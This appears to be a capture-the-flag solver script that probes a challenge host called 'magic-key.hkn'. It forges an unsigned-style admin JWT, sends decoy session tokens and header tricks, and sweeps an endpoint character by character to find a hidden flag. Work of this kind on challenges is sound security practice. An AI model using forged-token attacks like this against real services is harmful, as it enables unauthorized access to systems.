#!/usr/bin/env python3
import base64, json, time, string, requests

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

header_b64 = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
payload_b64 = b64url(json.dumps({"admin": True, "timestamp": int(time.time())}, separators=(",", ":")).encode())
forged_jwt = f"{header_b64}.{payload_b64}.deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdea"

MAGIC = "magic-key.hkn"
DECOY_TOKEN = "dGhpcyB0b2tlbiBpcyBub3QgZ29vZA"

JOKES = {
    "Hello there!", "General Kenobi!", "Retire Me industries",
    "Life is too short to remove USB safely.", "If it works, do not touch it.",
    "The production of too many useful things results in too many useless people.",
    "Yesterday it worked...", "Prove you are not a robot!", "Hihi", "3h",
    "I get enough exercise pushing my luck.", "Do not read the next sentence!",
}

print("### Sweeping magic-key.hkn/next_chars with Session-Token(decoy) + URL-Maybe:/flag + JWT(forged admin:true) ###")
non_joke_hits = []
for c in string.printable:
    if c in "\n\r\t\x0b\x0c":
        continue
    try:
        r = requests.get(f"http://{MAGIC}/next_chars", params={"char": c}, headers={
            "Session-Token": DECOY_TOKEN,
            "URL-Maybe": "/flag",
            "JWT": forged_jwt
        }, timeout=4)
        body = r.text.strip()
        clean = body.strip('"')
        if r.status_code == 200 and clean not in JOKES and body not in ("[]", ""):
            non_joke_hits.append((c, r.status_code, body))
            print(f"  !!! char={c!r} -> {r.status_code}: {body}")
    except requests.exceptions.RequestException as e:
        print(f"  char={c!r} ERROR: {e}")

print(f"\nNon-joke/non-empty hits: {len(non_joke_hits)}")
if not non_joke_hits:
    print("All responses were either jokes, empty, or errors -- JWT does not change magic-key's behavior here.")

# Also try /flag with the same triple combo, and dump full response
print("\n### /flag with the same triple combo ###")
r = requests.get(f"http://{MAGIC}/flag", headers={
    "Session-Token": DECOY_TOKEN,
    "URL-Maybe": "/flag",
    "JWT": forged_jwt
}, timeout=5)
print(f"  -> {r.status_code}: {r.text.strip()[:300]}")
